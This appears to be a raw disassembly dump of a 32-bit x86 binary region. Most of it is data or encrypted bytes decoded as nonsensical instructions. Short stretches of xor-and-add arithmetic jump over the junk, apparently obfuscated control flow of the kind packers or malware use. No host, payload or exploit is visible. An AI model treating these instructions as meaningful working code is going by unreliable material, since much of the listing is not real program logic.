  40c28b:	fidivr DWORD PTR [edi]
  40c28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c28e:	lds    ebp,FWORD PTR [edi]
  40c290:	mov    ebx,DWORD PTR [ebp+0x24d48753]
  40c296:	fwait
  40c297:	adc    eax,0x9fd061ac
  40c29c:	retf   
  40c29d:	fnstenv [ebx]
  40c29f:	popa   
  40c2a0:	test   al,0xbd
  40c2a2:	test   DWORD PTR [esi],0xc60cc93b
  40c2a8:	stos   DWORD PTR es:[di],eax
  40c2aa:	rol    DWORD PTR [ecx],0x93
  40c2ad:	fdiv   QWORD PTR [esi+eax*1-0x58]
  40c2b1:	outs   dx,DWORD PTR ds:[esi]
  40c2b2:	inc    ebx
  40c2b3:	sub    al,0x56
  40c2b5:	xor    cl,BYTE PTR [ebp-0x36]
  40c2b8:	pop    esi
  40c2b9:	test   DWORD PTR [ebx+edx*2-0x414900e4],ecx
  40c2c0:	mov    edx,0x6a636658
  40c2c5:	xor    eax,0x6d509a13
  40c2ca:	dec    edx
  40c2cb:	xor    edx,DWORD PTR [ebx-0x4deee927]
  40c2d1:	fisttp WORD PTR [eax-0x67bbc4ca]
  40c2d7:	add    eax,ecx
  40c2d9:	js     0x40c2bc
  40c2db:	fiadd  WORD PTR [edx]
  40c2dd:	add    ch,BYTE PTR [edx+0x0]
  40c2e0:	sbb    al,0xd9
  40c2e2:	repz rcr BYTE PTR [esi-0x51397367],0xaa
  40c2ea:	add    eax,0xc19c13bd
  40c2ef:	cmp    BYTE PTR [eax-0x6a732aec],ch
  40c2f5:	gs call 0x7cf5:0x7af4155a
  40c2fd:	push   edi
  40c2fe:	mov    bl,0xa3
  40c300:	mov    ch,0x25
  40c302:	sbb    ebx,DWORD PTR [edi]
  40c304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c305:	adc    cl,BYTE PTR [edx+0x50]
  40c308:	nop
  40c309:	fiadd  DWORD PTR [edx+0x30e838b9]
  40c30f:	mov    BYTE PTR [ebx-0x1],ah
  40c312:	or     al,0xd6
  40c314:	cmp    eax,0x5ca26fac
  40c319:	retf   0xe7b9
  40c31c:	adc    eax,0xceb38533
  40c321:	sbb    BYTE PTR [eax+0x65],al
  40c324:	add    al,0x9a
  40c326:	call   0x7423c88e
  40c32b:	jnp    0x40c313
  40c32d:	psrld  mm0,QWORD PTR [ebx+0x33aba2ca]
  40c334:	in     al,0x49
  40c336:	call   0x7f005a5d
  40c33b:	dec    ecx
  40c33c:	cmp    ch,BYTE PTR [ebp+0x294f448b]
  40c342:	push   edi
  40c343:	pop    es
  40c344:	xor    eax,DWORD PTR [edi]
  40c346:	pop    edx
  40c347:	(bad)  
  40c348:	into   
  40c349:	mov    edi,0xeaf2c2e4
  40c34e:	inc    eax
  40c34f:	jns    0x40c348
  40c351:	rdpmc  
  40c353:	fwait
  40c354:	adc    bl,BYTE PTR [ebp+0x70]
  40c357:	ficomp WORD PTR [ebp*4+0x18eb4c4b]
  40c35e:	push   es
  40c35f:	psllq  mm3,QWORD PTR [eax+0x29]
  40c363:	fcmovu st,st(6)
  40c365:	dec    esi
  40c366:	(bad)  [eax+0x1d]
  40c369:	mov    ?,esp
  40c36b:	xchg   edx,eax
  40c36c:	mov    al,0x5c
  40c36e:	mov    edx,0x46a68323
  40c373:	xchg   esp,eax
  40c374:	loopne 0x40c2f8
  40c376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c377:	ins    DWORD PTR es:[edi],dx
  40c378:	dec    esi
  40c379:	fcmovb st,st(6)
  40c37b:	outs   dx,DWORD PTR ds:[esi]
  40c37c:	int    0x5c
  40c37e:	push   es
  40c37f:	daa    
  40c380:	mov    eax,fs
  40c382:	fwait
  40c383:	cmp    edi,edi
  40c385:	clc    
  40c386:	mov    ds:0xf5559847,al
  40c38b:	rcr    BYTE PTR [ebp-0x12a47843],cl
  40c391:	mov    DWORD PTR [edx-0x217d6e89],ecx
  40c397:	daa    
  40c398:	pop    eax
  40c399:	add    DWORD PTR ds:0x131a59b3,eax
  40c39f:	shr    ebp,cl
  40c3a1:	in     eax,dx
  40c3a2:	dec    ebp
  40c3a3:	xchg   ebx,eax
  40c3a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3a5:	xor    al,0x9f
  40c3a7:	stos   DWORD PTR es:[edi],eax
  40c3a8:	fdiv   QWORD PTR [ecx-0x382e8445]
  40c3ae:	inc    eax
  40c3af:	xchg   ebx,eax
  40c3b0:	ja     0x40c39e
  40c3b2:	outs   dx,DWORD PTR ds:[esi]
  40c3b3:	dec    ebp
  40c3b4:	sub    eax,0xdf884b20
  40c3b9:	out    0xe9,al
  40c3bb:	mov    dh,0x23
  40c3bd:	dec    edx
  40c3be:	out    0x7b,eax
  40c3c0:	push   0xffffffd8
  40c3c2:	lahf   
  40c3c3:	sub    ebp,DWORD PTR [esi+0x1f]
  40c3c6:	int    0x8
  40c3c8:	ror    DWORD PTR [edx+0x59158d3e],0xf4
  40c3cf:	neg    DWORD PTR [eax+0x4a]
  40c3d2:	arpl   WORD PTR [esi+0x2b],bx
  40c3d5:	rcl    BYTE PTR [eax],cl
  40c3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3d8:	int    0x3b
  40c3da:	xchg   BYTE PTR [edx-0x6560b0ea],bh
  40c3e0:	sub    eax,0xe3d2c1bd
  40c3e5:	push   edi
  40c3e6:	or     BYTE PTR [ebx+0x54b9fc45],cl
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rol    DWORD PTR [ebx-0x13],cl
  40c448:	aas    
  40c449:	xchg   edi,eax
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	and    dh,BYTE PTR cs:[esi+ebx*1-0x3abb954e]
  40c45a:	fnstsw WORD PTR [edx+0x4419bf58]
  40c460:	jb     0x40c467
  40c462:	inc    edi
  40c463:	cmp    DWORD PTR [eax-0xbb8cdeb],esp
  40c469:	inc    esp
  40c46a:	loop   0x40c418
  40c46c:	adc    al,0x53
  40c46e:	push   eax
  40c46f:	popf   
  40c470:	cwde   
  40c471:	push   edi
  40c472:	ret    
  40c473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c474:	and    ebp,DWORD PTR [eax]
  40c476:	add    eax,0xc33b7d55
  40c47b:	sub    edx,DWORD PTR [edx+0xa]
  40c47e:	jp     0x40c4e7
  40c480:	fucomp st(7)
  40c482:	out    dx,eax
  40c483:	test   DWORD PTR [ecx-0x3eeced2e],esp
  40c489:	loop   0x40c46b
  40c48b:	shr    BYTE PTR [esi],0xba
  40c48e:	push   0x6c
  40c490:	scas   eax,DWORD PTR es:[edi]
  40c491:	rcr    ebx,0x8c
  40c494:	push   edi
  40c495:	sub    DWORD PTR [edi+0x37],0xffffffc4
  40c499:	loope  0x40c512
  40c49b:	mov    edx,DWORD PTR [esi+edx*2]
  40c49e:	dec    ecx
  40c49f:	enter  0x6395,0x59
  40c4a3:	mov    DWORD PTR [edi],0xd0c90c8f
  40c4a9:	xchg   BYTE PTR [esi-0x4563717f],dh
  40c4af:	das    
  40c4b0:	xchg   ebx,eax
  40c4b1:	aaa    
  40c4b2:	mov    edi,DWORD PTR [ecx-0x3fad0cbb]
  40c4b8:	stos   DWORD PTR es:[edi],eax
  40c4b9:	inc    ebp
  40c4ba:	pushf  
  40c4bb:	mov    eax,ds:0x7d9ddf31
  40c4c0:	push   es
  40c4c1:	and    esp,DWORD PTR [ecx]
  40c4c3:	in     eax,0xe6
  40c4c5:	mov    ah,0x3b
  40c4c7:	fwait
  40c4c8:	add    dl,BYTE PTR ss:[ebx+ecx*8-0x7f7f6143]
  40c4d0:	adc    DWORD PTR [edx+edx*4-0x70],ebx
  40c4d4:	dec    esp
  40c4d5:	pop    esp
  40c4d6:	(bad)  
  40c4d7:	xchg   ebp,eax
  40c4d8:	cmc    
  40c4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4da:	popf   
  40c4db:	add    DWORD PTR [esp+edi*1-0x70bc20c0],0xffffff90
  40c4e3:	inc    esi
  40c4e4:	dec    ebx
  40c4e5:	pop    eax
  40c4e6:	mov    edi,0xa9edbddc
  40c4eb:	jmp    0x715b89d0
  40c4f0:	xchg   edx,eax
  40c4f1:	mov    bl,0x77
  40c4f3:	adc    DWORD PTR [ebp+edi*4-0x37],0xe1cda4d4
  40c4fb:	jae    0x40c49e
  40c4fd:	pop    ebp
  40c4fe:	inc    esi
  40c4ff:	pop    fs
  40c501:	sbb    eax,0x167e1fd7
  40c506:	xchg   edi,eax
  40c507:	sub    DWORD PTR [ebx-0x56a53269],ebx
  40c50d:	xchg   ebp,eax
  40c50e:	add    al,0x7c
  40c510:	jne    0x40c4b6
  40c512:	(bad)  
  40c513:	in     al,dx
  40c514:	ins    BYTE PTR es:[edi],dx
  40c515:	and    bh,BYTE PTR [edx+ebp*8-0x13fdd9cf]
  40c51c:	mov    bh,0xa5
  40c51e:	xchg   BYTE PTR [ebp+0x4c3d07c1],cl
  40c524:	add    al,bh
  40c526:	push   edx
  40c527:	pop    eax
  40c528:	cmp    al,0x66
  40c52a:	shl    BYTE PTR [ebp+ebx*2-0x3f16e98],1
  40c531:	rcr    BYTE PTR [ecx-0x42],1
  40c534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c535:	push   es
  40c536:	(bad)  
  40c537:	(bad)  [edx+eax*2]
  40c53a:	cwde   
  40c53b:	jl     0x40c591
  40c53d:	and    al,0xd
  40c53f:	add    eax,DWORD PTR [eax+0x9]
  40c542:	push   esp
  40c543:	adc    esi,eax
  40c545:	push   cs
  40c546:	in     eax,0x82
  40c548:	pushf  
  40c549:	dec    ebx
  40c54a:	test   al,0x10
  40c54c:	pop    esi
  40c54d:	push   ebp
  40c54e:	add    al,0x99
  40c550:	rcl    DWORD PTR [esi],0x31
  40c553:	mov    edi,0xe7fb7b8c
  40c558:	xchg   esi,eax
  40c559:	jmp    FWORD PTR [esi-0x2c483fce]
  40c55f:	cli    
  40c560:	sar    eax,0x81
  40c563:	cmp    cl,BYTE PTR [ebx-0x3b]
  40c566:	ins    BYTE PTR es:[edi],dx
  40c567:	xor    edi,edi
  40c569:	mov    esp,0x450a17b3
  40c56e:	mov    eax,ds:0x2728391b
  40c573:	dec    edi
  40c574:	push   cs
  40c575:	jmp    0x802e:0x14e80adc
  40c57c:	jg     0x40c5a4
  40c57e:	sub    BYTE PTR [edx+0x58],cl
  40c581:	cld    
  40c582:	cld    
  40c583:	xor    ebp,DWORD PTR [ecx]
  40c585:	push   edi
  40c586:	into   
  40c587:	sub    al,0x8b
  40c589:	push   esp
  40c58a:	gs (bad) 
  40c58c:	push   ebp
  40c58d:	sbb    dl,cl
  40c58f:	scas   eax,DWORD PTR es:[edi]
  40c590:	test   DWORD PTR [edi+0x6218f6e1],0x997fef1c
  40c59a:	sbb    eax,0x255614be
  40c59f:	mov    ch,0x7a
  40c5a1:	jns    0x40c5b8
  40c5a3:	dec    ebp
  40c5a4:	and    ch,BYTE PTR [esi+eiz*2-0x6ca4e82c]
  40c5ab:	xlat   BYTE PTR ds:[ebx]
  40c5ac:	ins    DWORD PTR es:[edi],dx
  40c5ad:	retf   0x5350
  40c5b0:	jo     0x40c603
  40c5b2:	mov    ebx,0x801f30d9
  40c5b7:	xchg   ebp,eax
  40c5b8:	retf   0xf159
  40c5bb:	mov    ebp,0x528e16e6
  40c5c0:	add    al,0xa7
  40c5c2:	retf   
  40c5c3:	mov    ch,0xc
  40c5c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c6:	repnz stos BYTE PTR es:[edi],al
  40c5c8:	fild   QWORD PTR [ebp+0x1c115e13]
  40c5ce:	cmp    bh,BYTE PTR [edx]
  40c5d0:	out    dx,al
  40c5d1:	jo     0x40c562
  40c5d3:	xor    al,0x10
  40c5d5:	sahf   
  40c5d6:	add    DWORD PTR [edi],ecx
  40c5d8:	outs   dx,DWORD PTR ds:[esi]
  40c5d9:	jae    0x40c632
  40c5db:	enter  0x896f,0xdf
  40c5df:	rcr    BYTE PTR [edx-0x1f7628fe],1
  40c5e5:	hlt    
  40c5e6:	ss iret 
  40c5e8:	shr    DWORD PTR [esi-0x4cd51338],cl
  40c5ee:	jns    0x40c59e
  40c5f0:	mov    edi,0x24168c72
  40c5f5:	xor    eax,0x2a65b249
  40c5fa:	out    0xf2,al
  40c5fc:	ins    DWORD PTR es:[edi],dx
  40c5fd:	jp     0x40c5ef
  40c5ff:	xchg   edx,eax
  40c600:	std    
  40c601:	out    dx,eax
  40c602:	out    dx,al
  40c603:	fwait
  40c604:	and    BYTE PTR [edi],cl
  40c606:	into   
  40c607:	ror    DWORD PTR [ecx+ecx*8+0x17],0x5a
  40c60c:	or     eax,0x849b2603
  40c611:	aad    0x88
  40c613:	dec    ebp
  40c614:	nop
  40c615:	in     al,0x8a
  40c617:	sub    BYTE PTR [ecx+0x23],0xb4
  40c61b:	cmp    eax,0x984490dc
  40c620:	jo     0x40c5af
  40c622:	sahf   
  40c623:	gs jnp 0x40c648
  40c626:	xchg   DWORD PTR [edi-0x71],ecx
  40c629:	dec    DWORD PTR [ebp-0x3d]
  40c62c:	ror    BYTE PTR [ecx],0xe4
  40c62f:	sbb    DWORD PTR [ecx-0x41c4d824],0x52
  40c636:	in     al,dx
  40c637:	or     bh,ch
  40c639:	ds cmp ah,BYTE PTR gs:0x14e4c7df
  40c641:	stos   DWORD PTR es:[edi],eax
  40c642:	aad    0x24
  40c644:	imul   eax,eax,0x58b38e0a
  40c64a:	xchg   bh,bl
  40c64c:	or     al,0xcf
  40c64e:	and    ch,bh
  40c650:	out    0x46,al
  40c652:	cmp    DWORD PTR [eax-0x2d4aa4f0],ecx
  40c658:	cwde   
  40c659:	xchg   ebp,eax
  40c65a:	or     al,0x82
  40c65c:	mov    edx,0x5449ef8e
  40c661:	ds push edi
  40c663:	es sahf 
  40c665:	push   ebp
  40c666:	xchg   ecx,eax
  40c667:	sbb    al,BYTE PTR [esp+esi*1-0x7]
  40c66b:	(bad)  
  40c66c:	lea    ecx,ds:0xd7bdfba
  40c672:	dec    edi
  40c673:	jb     0x40c61e
  40c675:	fistp  DWORD PTR [ebx+0x19]
  40c678:	jmp    0x1bca:0xc3f7d5c3
  40c67f:	aas    
  40c680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c681:	push   0xffffffb3
  40c683:	sar    BYTE PTR [ebp+0x3583a86b],0xac
  40c68a:	inc    ebx
  40c68b:	inc    edi
  40c68c:	jne    0x40c63a
  40c68e:	(bad)  
  40c68f:	(bad)  
  40c690:	sbb    BYTE PTR [eax+0x5ebf8d5c],ah
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x7b42653f],dl
  40c6de:	cmp    ebx,edx
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	fs in  eax,0x2e
  40c6eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ec:	je     0x40c727
  40c6ee:	sbb    al,0x31
  40c6f0:	jnp    0x40c745
  40c6f2:	inc    esi
  40c6f3:	stos   BYTE PTR es:[edi],al
  40c6f4:	aam    0x80
  40c6f6:	ret    
  40c6f7:	les    esp,FWORD PTR [ecx-0x78667fd1]
  40c6fd:	xor    al,0xda
  40c6ff:	stos   DWORD PTR es:[edi],eax
  40c700:	push   0xdf04329f
  40c705:	or     eax,DWORD PTR ds:0x1228f243
  40c70b:	ja     0x40c724
  40c70d:	outs   dx,BYTE PTR ds:[esi]
  40c70e:	sbb    eax,0xcf9b2772
  40c713:	mov    ah,0xf6
  40c715:	mov    dh,0x48
  40c717:	into   
  40c718:	dec    edi
  40c719:	add    ebx,eax
  40c71b:	pop    esp
  40c71c:	rol    BYTE PTR [ebx-0x2e93e335],0x31
  40c723:	(bad)  
  40c725:	xchg   ecx,eax
  40c726:	out    0xb9,eax
  40c728:	adc    edi,eax
  40c72a:	adc    esi,DWORD PTR [eax-0x40527bfb]
  40c730:	imul   eax,DWORD PTR [edi+0x30c60459],0x47d83e2e
  40c73a:	hlt    
  40c73b:	mov    edx,fs
  40c73d:	mov    dl,0x7a
  40c73f:	lahf   
  40c740:	rcr    DWORD PTR [eax+0x67],cl
  40c743:	imul   ecx,edi,0xa71c7ebd
  40c749:	loop   0x40c734
  40c74b:	adc    dh,BYTE PTR [esi-0xd]
  40c74e:	fmul   DWORD PTR [esi+0x68]
  40c751:	stc    
  40c752:	out    dx,al
  40c753:	shl    BYTE PTR [edx],cl
  40c755:	mov    WORD PTR [ebp+0x5d],cs
  40c758:	inc    ecx
  40c759:	push   ebp
  40c75a:	outs   dx,DWORD PTR ds:[esi]
  40c75b:	adc    al,0xbf
  40c75d:	jne    0x40c6f6
  40c75f:	ds leave 
  40c761:	(bad)  [esi+edi*2+0x406c1727]
  40c768:	push   esp
  40c769:	adc    ah,BYTE PTR [ebp+0x409040cc]
  40c76f:	xor    eax,0xf4185519
  40c774:	inc    eax
  40c775:	fbstp  TBYTE PTR [eax+ecx*1-0x6]
  40c779:	add    al,0x92
  40c77b:	aam    0x9e
  40c77d:	rcr    BYTE PTR [eax],1
  40c77f:	ficom  WORD PTR [edx]
  40c781:	fsubr  st,st(6)
  40c783:	pop    edx
  40c784:	inc    esp
  40c785:	mov    dl,BYTE PTR [ecx]
  40c787:	loope  0x40c743
  40c789:	test   ah,ch
  40c78b:	pop    esi
  40c78c:	mov    ch,0xda
  40c78e:	sub    bl,0x95
  40c791:	xchg   esp,eax
  40c792:	adc    BYTE PTR ss:[esi],ch
  40c795:	pushf  
  40c796:	jecxz  0x40c812
  40c798:	popa   
  40c799:	pop    ebp
  40c79a:	cmp    al,BYTE PTR [ecx-0x7e7e039c]
  40c7a0:	pop    edi
  40c7a1:	inc    DWORD PTR ds:0x31cb9576
  40c7a7:	jae    0x40c77c
  40c7a9:	jg     0x40c768
  40c7ab:	pop    edi
  40c7ac:	jno    0x40c788
  40c7ae:	inc    ecx
  40c7af:	jne    0x40c824
  40c7b1:	dec    ebx
  40c7b2:	jmp    0x40c7b6
  40c7b4:	ret    0x8c34
  40c7b7:	jae    0x40c7aa
  40c7b9:	xchg   edi,eax
  40c7ba:	adc    DWORD PTR [ecx-0x23],edi
  40c7bd:	cli    
  40c7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7bf:	lods   al,BYTE PTR ds:[esi]
  40c7c0:	cmc    
  40c7c1:	xchg   ebp,eax
  40c7c2:	rcl    edi,1
  40c7c4:	sahf   
  40c7c5:	jns    0x40c7cc
  40c7c7:	aam    0x5d
  40c7c9:	sub    al,0x66
  40c7cb:	jmp    0x4fea:0xa2fa22a
  40c7d2:	iret   
  40c7d3:	pusha  
  40c7d4:	in     eax,0x35
  40c7d6:	icebp  
  40c7d7:	(bad)  
  40c7d8:	fsubr  DWORD PTR [edx+0x45bb9c47]
  40c7de:	dec    edx
  40c7df:	pop    ebp
  40c7e0:	test   ah,al
  40c7e2:	or     al,0xf8
  40c7e4:	mov    ds:0x99e20975,eax
  40c7e9:	fadd   st(0),st
  40c7eb:	not    bh
  40c7ed:	mov    cl,0x7
  40c7ef:	sub    ebp,0xffffff8b
  40c7f2:	push   0xececb9bd
  40c7f7:	xlat   BYTE PTR ds:[ebx]
  40c7f8:	mov    ds:0x2d41053f,eax
  40c7fd:	jp     0x40c838
  40c7ff:	test   ecx,eax
  40c801:	mov    ecx,0xf2f747a9
  40c806:	xchg   ebx,eax
  40c807:	jnp    0x40c86d
  40c809:	fistp  WORD PTR [ebp+0x4c]
  40c80c:	sbb    eax,0x3b9de171
  40c811:	pop    ds
  40c812:	jae    0x40c7dd
  40c814:	fstp   QWORD PTR [edx]
  40c816:	leave  
  40c817:	xor    DWORD PTR [ebp+0x7a75c185],ebp
  40c81d:	pop    ebp
  40c81e:	retf   0x5d53
  40c821:	in     eax,dx
  40c822:	(bad)  
  40c823:	sbb    eax,0xcc47df36
  40c828:	jnp    0x40c878
  40c82a:	push   edx
  40c82b:	jle    0x40c81e
  40c82d:	aad    0x4c
  40c82f:	gs push ebx
  40c831:	mov    al,0xcc
  40c833:	(bad)  
  40c834:	xchg   esi,eax
  40c835:	xlat   BYTE PTR ds:[ebx]
  40c836:	(bad)  
  40c837:	les    edx,FWORD PTR [esi+0x56]
  40c83a:	lods   al,BYTE PTR ds:[esi]
  40c83b:	clc    
  40c83c:	push   eax
  40c83d:	retf   
  40c83e:	jmp    0x40c830
  40c840:	mov    ds:0x5b04e962,al
  40c845:	(bad)  [edi]
  40c847:	out    0xe7,al
  40c849:	mov    edx,0x2565000
  40c84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c84f:	fdiv   QWORD PTR [ecx-0x4f]
  40c852:	mov    bh,0x3d
  40c854:	mov    dl,0xa9
  40c856:	leave  
  40c857:	mov    fs,esi
  40c859:	shr    DWORD PTR [ecx-0x52ac15ca],cl
  40c85f:	xchg   ecx,eax
  40c860:	call   0x8e1d5849
  40c865:	shl    edi,1
  40c867:	inc    eax
  40c868:	je     0x40c7f8
  40c86a:	sbb    DWORD PTR [si],esi
  40c86d:	or     al,al
  40c86f:	mov    ebp,0x663696fe
  40c874:	loop   0x40c806
  40c876:	xor    eax,0xa469a797
  40c87b:	sub    al,0x8d
  40c87d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c87e:	xlat   BYTE PTR ds:[ebx]
  40c87f:	imul   edx,DWORD PTR [eax+ecx*2-0x3e44d84a],0x9ee324cb
  40c88a:	stos   DWORD PTR es:[edi],eax
  40c88b:	hlt    
  40c88c:	or     eax,0x2092e6a5
  40c891:	aam    0x88
  40c893:	or     al,0x50
  40c895:	push   esp
  40c896:	fmul   QWORD PTR [ecx-0x9382baa]
  40c89c:	inc    eax
  40c89d:	push   ecx
  40c89e:	cmp    edx,ebx
  40c8a0:	jl     0x40c88d
  40c8a2:	pop    ebx
  40c8a3:	mov    DWORD PTR [ecx],ebx
  40c8a5:	sbb    BYTE PTR ds:0x6f062179,ch
  40c8ab:	cmp    eax,0xfbcbef60
  40c8b0:	int    0x8c
  40c8b2:	sbb    eax,0x6e5500ff
  40c8b7:	icebp  
  40c8b8:	pop    edi
  40c8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ba:	outs   dx,BYTE PTR ds:[esi]
  40c8bb:	pop    ss
  40c8bc:	fild   QWORD PTR [ebp+0x75c5aca3]
  40c8c2:	ds add eax,0xad8c8fe6
  40c8c8:	xor    edi,esp
  40c8ca:	imul   eax,edi,0xffffffd2
  40c8cd:	push   edi
  40c8ce:	sub    eax,0x4c2dd0f4
  40c8d3:	push   esp
  40c8d4:	loopne 0x40c8e5
  40c8d6:	out    0x8,al
  40c8d8:	jecxz  0x40c89e
  40c8da:	cs cli 
  40c8dc:	inc    ebp
  40c8dd:	dec    ecx
  40c8de:	push   esp
  40c8df:	stc    
  40c8e0:	mov    edx,0x7399cffb
  40c8e5:	push   ebx
  40c8e6:	sub    DWORD PTR gs:[ebx+0x36],0xffffffed
  40c8eb:	xor    al,0xd1
  40c8ed:	xor    DWORD PTR [edi+0x290d43e8],edx
  40c8f3:	and    ebp,DWORD PTR [edx-0x4]
  40c8f6:	mov    al,ds:0x760d1c7f
  40c8fb:	jo     0x40c8fa
  40c8fd:	xchg   esp,eax
  40c8fe:	(bad)  
  40c8ff:	cmp    eax,DWORD PTR [ecx-0x243728c1]
  40c905:	inc    esp
  40c906:	cld    
  40c907:	int    0x72
  40c909:	inc    esi
  40c90a:	or     DWORD PTR ds:0xa37ed209,edx
  40c910:	ja     0x40c938
  40c912:	je     0x40c8f4
  40c914:	push   esp
  40c915:	push   eax
  40c916:	scas   eax,DWORD PTR es:[edi]
  40c917:	jle    0x40c903
  40c919:	inc    edx
  40c91a:	jle    0x40c95e
  40c91c:	stc    
  40c91d:	jno    0x40c960
  40c91f:	paddsb mm2,QWORD PTR [ebx+0x1e]
  40c923:	pop    ds
  40c924:	mov    DWORD PTR [edx+eax*2-0x21c687b4],edi
  40c92b:	bound  eax,QWORD PTR [eax+0x8]
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [esi-0x67b302c9],esp
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	int3   
  40c951:	sub    DWORD PTR [edx],esi
  40c953:	jecxz  0x40c9ad
  40c955:	mov    bh,0xa1
  40c957:	adc    DWORD PTR [edx-0x13fa1dbf],ecx
  40c95d:	(bad)
  40c962:	or     bl,BYTE PTR [esp+eax*4]
  40c965:	mov    DWORD PTR [esi+edi*4],ecx
  40c968:	add    eax,0x6fb76bdf
  40c96d:	pop    edi
  40c96e:	cli    
  40c96f:	pop    ebx
  40c970:	cmp    al,BYTE PTR [esi-0x1e]
  40c973:	inc    ecx
  40c974:	ret    
  40c975:	int3   
  40c976:	hlt    
  40c977:	sub    bl,dh
  40c979:	int3   
  40c97a:	inc    ebp
  40c97b:	loop   0x40c911
  40c97d:	cdq    
  40c97e:	or     al,0x8a
  40c980:	jnp    0x40c9b5
  40c982:	adc    BYTE PTR [edi-0x3e],ah
  40c985:	adc    bl,BYTE PTR [ecx-0xc]
  40c988:	loop   0x40c9d5
  40c98a:	je     0x40c989
  40c98c:	add    DWORD PTR [edi],eax
  40c98e:	xchg   edx,eax
  40c98f:	out    0x2f,al
  40c991:	or     DWORD PTR [esi+ebp*8+0x73c36584],edx
  40c998:	call   0xaa60:0x10680643
  40c99f:	test   BYTE PTR [ebx-0x2],ah
  40c9a2:	mov    ds:0x6737b55c,eax
  40c9a7:	icebp  
  40c9a8:	jb     0x94f6b591
  40c9ae:	mov    eax,0xa1dd8325
  40c9b3:	mov    dl,0x0
  40c9b5:	das    
  40c9b6:	nop
  40c9b7:	and    BYTE PTR [edx],0x5b
  40c9ba:	mov    bl,BYTE PTR [ebx+0x6211582a]
  40c9c0:	mov    WORD PTR [esi],?
  40c9c2:	xor    BYTE PTR ds:0xf6d872d4,cl
  40c9c8:	outs   dx,DWORD PTR ds:[esi]
  40c9c9:	mov    ah,0x4d
  40c9cb:	dec    esp
  40c9cc:	js     0x40c9b2
  40c9ce:	pop    es
  40c9cf:	xor    ebp,DWORD PTR [esi+0x6567184d]
  40c9d5:	xchg   ecx,eax
  40c9d6:	and    eax,0xb3c4cb2a
  40c9db:	jno    0x40c9da
  40c9dd:	and    eax,0xc9f6f6ff
  40c9e2:	mov    eax,ds:0x1502f8cc
  40c9e7:	inc    ecx
  40c9e8:	pop    ss
  40c9e9:	pop    ebx
  40c9ea:	mov    ebp,0x4c8141a3
  40c9ef:	fist   WORD PTR [esi+0x58]
  40c9f2:	mov    bh,0x9c
  40c9f4:	xor    BYTE PTR [edi+0x41],dh
  40c9f7:	into   
  40c9f8:	shr    DWORD PTR ds:0x691ab4fd,0x73
  40c9ff:	jnp    0x40c9ce
  40ca01:	in     al,dx
  40ca02:	or     DWORD PTR [edi+0xe],edx
